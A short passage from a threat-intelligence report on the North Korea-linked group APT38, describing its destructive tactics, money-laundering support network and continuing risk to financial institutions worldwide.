+Figure 1: APT38 Attack Lifecycle
+
+APT38 is unique in that it is not afraid to aggressively destroy evidence or victim networks as part of its operations. This attitude toward destruction is probably a result of the group trying to not only cover its tracks, but also to provide cover for money laundering operations.
+
+In addition to cyber operations, public reporting has detailed recruitment and cooperation of individuals in-country to support with the tail end of APT38’s thefts, including persons responsible for laundering funds and interacting with recipient banks of stolen funds. This adds to the complexity and necessary coordination amongst multiple components supporting APT38 operations.
+
+Despite recent efforts to curtail their activity, APT38 remains active and dangerous to financial institutions worldwide. By conservative estimates, this actor has stolen over a hundred million dollars, which would be a major return on the likely investment necessary to orchestrate these operations. Furthermore, given the sheer scale of the thefts they attempt, and their penchant for destroying targeted networks, APT38 should be considered a serious risk to the sector.
